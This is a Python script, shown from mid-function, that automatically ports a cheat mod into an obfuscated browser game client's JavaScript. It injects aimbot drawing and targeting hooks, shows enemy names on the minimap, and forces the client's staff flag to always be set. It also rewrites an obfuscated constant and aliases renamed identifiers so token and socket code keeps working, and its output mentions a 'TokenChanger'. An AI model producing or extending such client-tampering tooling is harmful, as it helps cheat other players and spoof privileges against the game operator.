        fail("minimap player-dot draw (`World.players[E[k]]` + two `Math.(...,400)` coords + blit)")
    # render scale: `var <w> = <const> * <scale>` at the top of the map fn
    map_fn_i = None
    for k in range(map_draw_i, max(0, map_draw_i - 200), -1):
        if re.match(r'^\s*function\s+%s\s*\(' % W, L[k]):
            map_fn_i = k
            break
    MAP_S = SCALE
    if map_fn_i is not None:
        for k in range(map_fn_i + 1, map_draw_i):
            ms = re.search(r'var\s+%s\s*=\s*%s\s*\*\s*(%s)\s*;' % (W, W, W), L[k])
            if ms:
                MAP_S = ms.group(1)
                break
    patches.append((map_draw_i + 1, map_draw_i + 1, [
        "          try {",
        "            if (__gk(MOD.ShowNamesOnMap)) {",
        "              var _grokMapNick = grokGetNick(%s) || (\"#\" + %s[%s]);" % (P_var, E_var, pid_key),
        "              ctx.save();",
        "              ctx.globalAlpha = 1;",
        "              ctx.textAlign = \"center\";",
        "              ctx.textBaseline = \"bottom\";",
        "              ctx.font = \"700 \" + Math.max(10, Math.floor(11 * %s)) + \"px Viga, Arial, sans-serif\";" % MAP_S,
        "              ctx.lineWidth = Math.max(3, Math.floor(3 * %s));" % MAP_S,
        "              ctx.strokeStyle = \"#000000\";",
        "              ctx.fillStyle = MOD.EnemyClanColor;",
        "              ctx.strokeText(_grokMapNick, %s * %s, %s * %s - Math.max(8, 8 * %s));" % (map_dx, MAP_S, map_dy, MAP_S, MAP_S),
        "              ctx.fillText(_grokMapNick, %s * %s, %s * %s - Math.max(8, 8 * %s));" % (map_dx, MAP_S, map_dy, MAP_S, MAP_S),
        "              ctx.restore();",
        "            }",
        "          } catch (e) {}",
    ]))

    # ---- 9) AimbotDraw declaration after the 2d context nearest the frame ----
    ctx_cands = scan_all(lambda s: '("2d")' in s)
    if not ctx_cands:
        fail("offscreen 2d context (`(\"2d\")`)")
    before = [i for i in ctx_cands if i < i_call]
    i_ctx = before[-1] if before else ctx_cands[-1]
    patches.append((i_ctx + 1, i_ctx + 1, [
        "    function AimbotDraw() {",
        "      let aimAlpha = ctx.globalAlpha",
        "        , aimWidth = ctx.lineWidth;",
        "      for (var aimLine = 0; aimLine < GetAllTargets.lines.length; aimLine++) {",
        "        let pos = GetAllTargets.lines[aimLine];",
        "        ctx.lineWidth = pos.width;",
        "        ctx.globalAlpha = pos.alpha;",
        "        ctx.strokeStyle = pos.color;",
        "        ctx.beginPath();",
        "        ctx.moveTo((%s + pos.x1) * %s, (%s + pos.y1) * %s);" % (CAMX, SCALE, CAMY, SCALE),
        "        ctx.lineTo((%s + pos.x2) * %s, (%s + pos.y2) * %s);" % (CAMX, SCALE, CAMY, SCALE),
        "        ctx.stroke();",
        "      }",
        "      ctx.globalAlpha = aimAlpha;",
        "      ctx.lineWidth = aimWidth;",
        "      GetAllTargets.cameraCenter = {",
        "        x: ctx.canvas.width / 2 / %s - %s," % (SCALE, CAMX),
        "        y: ctx.canvas.height / 2 / %s - %s" % (SCALE, CAMY),
        "      };",
        "      try {",
        "        if (GetAllTargets && GetAllTargets.mousePosition) {",
        "          GetAllTargets.mouseMapCords = {",
        "            x: GetAllTargets.mousePosition.x / %s - %s," % (SCALE, CAMX),
        "            y: GetAllTargets.mousePosition.y / %s - %s" % (SCALE, CAMY),
        "          };",
        "        }",
        "      } catch (e) {}",
        "      if (MOD.mouseFovEnable) {",
        "        GetAllTargets.mouseMapCords = {",
        "          x: GetAllTargets.mousePosition.x / %s - %s," % (SCALE, CAMX),
        "          y: GetAllTargets.mousePosition.y / %s - %s" % (SCALE, CAMY),
        "        };",
        "      }",
        "    }",
        "    ;",
    ]))

    # ---- 10) AimbotDraw() call in the frame function ----
    patches.append((i_call, i_call, ["      AimbotDraw();"]))

    # ---- 11) mod block before the last WaitANDrunHTML(); ----
    run_cands = scan_all(lambda s: s.strip() == 'WaitANDrunHTML();')
    if not run_cands:
        fail("`WaitANDrunHTML();` call")
    i_run = run_cands[-1]
    patches.append((i_run, i_run, ["/* ===================== MOD BLOCK (ported) ===================== */"]
                    + block.split('\n')
                    + ["/* =================== MOD BLOCK end =================== */"]))

    # apply bottom-up
    for start, end, new in sorted(patches, key=lambda p: -p[0]):
        L[start:end] = new

    return '\n'.join(L)



REAL_ANGLE_GUARD = ('typeof MOD !== "undefined" && (MOD.ShowRealAngles === "always" || '
                    'MOD.ShowRealAngles === "withAim" && MOD.AimBotEnabled)')


def patch_real_angles(src: str) -> tuple[str, str]:
    """Make the LOCAL player render its real (interpolated) angle.

    The client picks the angle in a branch of the form

        if (World.PLAYER[id] === obj.owner && ...) {   // this is me
          obj[ANGLE] = <aimbot/standard angle>;
        } else if (obj.owner === 0) {
          obj[CUR] = lerp(obj[CUR], obj[POV], obj.speed / 2);
        } else {
          obj[ANGLE] = lerp(obj[CUR], obj[POV], obj.speed * 2);
        }

    Only the first (local player) assignment is wrapped: when ShowRealAngles is
    "always", or "withAim" with the aimbot on, the angle is interpolated toward
    the real angle with the doubled coefficient; otherwise the client's own
    value is kept.  Other players are left exactly as the client had them.

    All names (object, angle field, current/real angle fields, smoothing field
    and the interpolation function) are detected in the given client.
    """
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    ACC = r'(?:\.%s|\[%s\])' % (W, W)

    # Older versions of this porter patched the *other* players' branch.
    # Undo any such injection first so the repair is idempotent.
    prev = re.compile(r'if \(\s*(?:typeof MOD[^{]*?)?MOD\.ShowRealAngles[^{]*\{'
                      r'(?P<real>[^{}]*)\} else \{(?P<orig>[^{}]*)\}')
    src, undone = prev.subn(lambda m: m.group('orig').strip(), src)

    L = src.split('\n')
    branch = re.compile(
        r'if \(\s*(?:World\.PLAYER\[%s\]\s*===\s*(?P<o1>%s)%s'
        r'|(?P<o2>%s)%s\s*===\s*World\.PLAYER\[%s\])' % (W, W, ACC, W, ACC, W))

    for i, line in enumerate(L):
        if 'World.PLAYER[' not in line:
            continue
        mb = branch.search(line)
        if not mb:
            continue
        obj = mb.group('o1') or mb.group('o2')
        O = re.escape(obj)
        # the local-player angle assignment: first statement of that branch
        asg = None
        for j in range(i, min(i + 4, len(L))):
            asg = re.search(r'(?P<lhs>%s%s)\s*=\s*(?P<rhs>[^;{}]+);' % (O, ACC), L[j])
            if asg:
                i_asg = j
                break
        if not asg:
            continue
        # a sibling branch interpolates the real angle: reuse its fields
        lerp = re.search(
            r'%s%s\s*=\s*(?P<call>%s(?:%s)?)\(\s*(?P<cur>%s%s)\s*,\s*'
            r'(?P<pov>%s%s)\s*,\s*(?P<fac>[^,)]+?)(?:\s*[*/]\s*[^,)]+)?\s*\)'
            % (O, ACC, W, ACC, O, ACC, O, ACC),
            '\n'.join(L[i_asg:min(i_asg + 14, len(L))]))
        if not lerp:
            continue
        real = '%s = %s(%s, %s, %s * 2)' % (
            asg.group('lhs'), re.sub(r'\s+', '', lerp.group('call')),
            lerp.group('cur'), lerp.group('pov'), lerp.group('fac'))
        original = asg.group(0).rstrip(';')
        guard = ('if (%s) {%s;} else {%s;}' % (REAL_ANGLE_GUARD, real, original))
        L[i_asg] = L[i_asg][:asg.start()] + guard + L[i_asg][asg.end():]
        info = 'local player angle -> %s (undid %d old patch(es))' % (real, undone)
        return '\n'.join(L), info

    raise AimbotPortError('anchor not found: local player angle branch '
                          '(`if (World.PLAYER[id] === obj.owner ...)` with a '
                          'sibling angle interpolation)')


def patch_servers_player_flag(src: str) -> tuple[str, str]:
    """Duplicate the `World.PLAYER.<prop> = <val>;` staff flag.

    The client sets the server list and only later, inside the
    admin/moderator/member branches, assigns the staff flag:

        document[A]("servers")[B] = C;
        if (home.X("admin") !== null || ...) {
          ...
          World.PLAYER.FLAG = VALUE;

    We copy that `World.PLAYER.FLAG = VALUE;` statement and insert it
    *before* the `document[...]("servers")[...] = ...;` line, so the flag is
    always set.  Idempotent: a copy already sitting in front is not doubled.
    """
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    servers_re = re.compile(r'document\s*(?:\[\s*%s\s*\]|\.%s)\s*\(\s*["\']servers["\']\s*\)'
                            r'\s*(?:\[[^\]]*\]|\.%s)\s*=' % (W, W, W))
    flag_re = re.compile(r'World\.PLAYER\s*(?:\.%s|\[[^\]]*\])\s*=\s*[^;{}]+;' % W)

    L = src.split('\n')
    done = []
    already = 0
    i = 0
    while i < len(L):
        m = servers_re.search(L[i])
        if not m:
            i += 1
            continue
        # nearest staff-flag assignment below the servers line
        flag = None
        for j in range(i, min(i + 60, len(L))):
            fm = flag_re.search(L[j])
            if fm:
                flag = fm.group(0).strip()
                break
        if not flag:
            i += 1
            continue
        # already inserted?
        before = '\n'.join(L[max(0, i - 3):i])
        if flag in before or flag in L[i][:m.start()]:
            already += 1
            i += 1
            continue
        indent = re.match(r'\s*', L[i]).group(0)
        L.insert(i, indent + flag)
        done.append(flag)
        i += 2
    if not done:
        if already:
            return src, 'already present (%d)' % already
        raise AimbotPortError('anchor not found: document[...]("servers")[...] = ... '
                              'with a following World.PLAYER.<flag> assignment')
    return '\n'.join(L), '%d insert(s): %s' % (len(done), '; '.join(done[:3]))


def patch_zero_const(src: str) -> tuple[str, str]:
    """Rewrite `var <name> = 0.12;` declarations to `= 0;`.

    The variable name is obfuscated and changes every build, so the constant
    itself is the anchor: every `var|let|const X = 0.12;` becomes
    `var|let|const X = 0;`.  Idempotent: once patched there is no `0.12;`
    declaration left to match.
    """
    W = r'[^\s\.\[\]\(\)\{\};,=!+*/-]+'
    decl_re = re.compile(r'\b(?:var|let|const)\s+%s\s*=\s*0\.12\s*;' % W)
    out, n = decl_re.subn(lambda m: m.group(0).replace('0.12', '0'), src)
    if not n:
        if re.search(r'\b(?:var|let|const)\s+%s\s*=\s*0\s*;' % W, src):
            return src, 'already 0 (nothing to patch)'
        raise AimbotPortError('anchor not found: var <name> = 0.12;')
    names = [m.group(0).strip() for m in decl_re.finditer(src)]
    return out, '%d replace(s): %s' % (n, ' | '.join(names[:3]))


def _stmt_end(src: str, start: int) -> int:
    """Return index just past the end of the statement/declaration starting at
    `start`. Handles var/const/let assignments (possibly multi-line function or
    object expressions), bare assignments, function/class declarations and
    expression statements. Tracks bracket depth and skips strings/comments."""
    n = len(src)
    # find the first meaningful char
    i = start
    while i < n and src[i] in ' \t':
        i += 1
    decl_fn = re.match(r'(?:async\s+)?(?:function|class)\b', src[i:])
    depth = 0
    mode = None  # '"', "'", '`', '//', '/*'
    saw_brace = False
    while i < n:
        c = src[i]
        if mode == '//':
            if c == '\n':
                mode = None
        elif mode == '/*':
            if c == '*' and i + 1 < n and src[i + 1] == '/':
                mode = None
                i += 1
        elif mode in ('"', "'", '`'):
            if c == '\\':
                i += 1
            elif c == mode:
                mode = None
        else:
            if c == '/' and i + 1 < n and src[i + 1] == '/':
                mode = '//'
                i += 1
            elif c == '/' and i + 1 < n and src[i + 1] == '*':
                mode = '/*'
                i += 1
            elif c in '"\'`':
                mode = c
            elif c in '{[(':
                depth += 1
                saw_brace = True
            elif c in '}])':
                depth -= 1
                if depth == 0 and decl_fn and saw_brace and c == '}':
                    # function/class declaration ends at its closing brace
                    return i + 1
            elif c == ';' and depth == 0:
                return i + 1
            elif c == '\n' and depth == 0 and decl_fn and saw_brace:
                return i  # safety: malformed
        i += 1
    return -1


def fix_vm_renamed_refs(src: str, names_path: str) -> tuple[str, int]:
    """VM-compiled runtime functions (socket factory, token fetches) resolve
    identifiers by their ORIGINAL obfuscated names through the global scope,
    while postprocess renamed those declarations (e.g. `const օࠂ๗` -> `const id`).
    Alias every renamed declaration onto window under its original name so the
    runtime-compiled code can still resolve it. Handles const/let/var
    one-liners, multi-line `var X = function(){...}`/`{...}` statements,
    nested `function X()` declarations and bare `X = ...` assignments."""
    import json as _json
    try:
        names = _json.loads(Path(names_path).read_text(encoding="utf-8"))
    except Exception:
        return src, 0
    inserts = []  # (pos, text)
    props = []    # (pos, text) object-literal `orig: value,` clones
    for orig, new in names.items():
        if not orig or orig == new or not isinstance(new, str):
            continue
        if 'window["%s"]' % orig in src or "window['%s']" % orig in src or 'window[%s]' % _json.dumps(orig, ensure_ascii=False) in src:
            continue
        alias = 'window[' + _json.dumps(orig, ensure_ascii=False) + '] = ' + new + ';'
        # 1) function/class declaration (nested or top-level)
        m = re.search(r'^[ \t]*(?:export\s+)?(?:async\s+)?(?:function|class)\s+' + re.escape(new) + r'\b', src, re.M)
        # 2) var/let/const declaration
        if not m:
            m = re.search(r'^[ \t]*(?:const|let|var)\s+' + re.escape(new) + r'\b', src, re.M)
        # 3) bare assignment `X = ...`
        if not m:
            m = re.search(r'^[ \t]*' + re.escape(new) + r'\s*=', src, re.M)
        if m:
            end = _stmt_end(src, m.start())
            if end < 0:
                continue
            # keep the original indentation
            ind = re.match(r'[ \t]*', src[m.start():]).group(0)
            inserts.append((end, '\n' + ind + alias))
            continue
        # 4) object-literal property `new: value,` -> add `orig: value,` sibling
        m = re.search(r'^([ \t]*)' + re.escape(new) + r'\s*:\s*([^,\n{}()]+),\s*$', src, re.M)
        if m:
            props.append((m.end(), '\n' + m.group(1) + orig + ': ' + m.group(2) + ','))
            continue
    for pos, text in sorted(inserts + props, key=lambda t: -t[0]):
        src = src[:pos] + text + src[pos:]
    return src, len(inserts)


def main() -> None:
    ap = argparse.ArgumentParser(description="Auto-port AutoLoot/AutoBuild/Open/Chat/Nicks/Menu into obfuscated client")
    ap.add_argument("script", help="path to new client .js")
    ap.add_argument("-o", "--output", help="output path (default: <name>_with_mod.js)")
    ap.add_argument("--report-only", action="store_true", help="only print detection report")
    ap.add_argument(
        "--override",
        action="append",
        default=[],
        help="override: loot=NAME, build.rot=NAME, buckets=NAME, nick=NAME, inventory=NAME, ...",
    )
    args = ap.parse_args()

    src = Path(args.script).read_text(encoding="utf-8", errors="ignore")
    src, n_alias = fix_vm_renamed_refs(src, str(Path(args.script).parent / '_names.json'))
    if n_alias:
        print(f"  vm name aliases: {n_alias} inserted")
    mapping = analyze(src)
    apply_overrides(mapping, args.override)
    print_report(mapping)

    if args.report_only:
        return

    mod = generate_mod(mapping)
    out = inject(src, mod, (mapping.get("entities") or {}).get("obj") or ENTITY_OBJ_DEFAULT)
    try:
        out = port_aimbot(out, (mapping.get("entities") or {}).get("obj") or ENTITY_OBJ_DEFAULT)
        print("  aimbot: injected (hooks + dat.GUI aim folders + TokenChanger)")
    except Exception as exc:
        print(f"  WARNING aimbot port failed: {exc}")
    # real angles for the local player: also repaired on clients that already
    # carry a ported aimbot
    try:
        out, ra_info = patch_real_angles(out)
        print(f"  real angles: {ra_info}")
    except Exception as exc:
        print(f"  WARNING real angles patch failed: {exc}")
    try:
        out, sf_info = patch_servers_player_flag(out)
        print(f"  staff flag before servers list: {sf_info}")
    except Exception as exc:
        print(f"  WARNING staff flag patch failed: {exc}")
    try:
        out, zc_info = patch_zero_const(out)
        print(f"  zero const (0.12 -> 0): {zc_info}")
    except Exception as exc:
        print(f"  WARNING zero const patch failed: {exc}")
    if args.output:
        out_p = Path(args.output)
    else:
        out_p = Path(args.script).with_name(Path(args.script).stem + "_with_mod.js")
    if not out_p.is_absolute():
        out_p = Path.cwd() / out_p
    out_p.parent.mkdir(parents=True, exist_ok=True)
    out_p.write_text(out, encoding="utf-8")
    print(f"\nwritten: {out_p}")
    print("keys: Q=AutoLoot  B=AutoBuild  L=PlayerList  H=Menu  RMB=no punch")


if __name__ == "__main__":
    main()
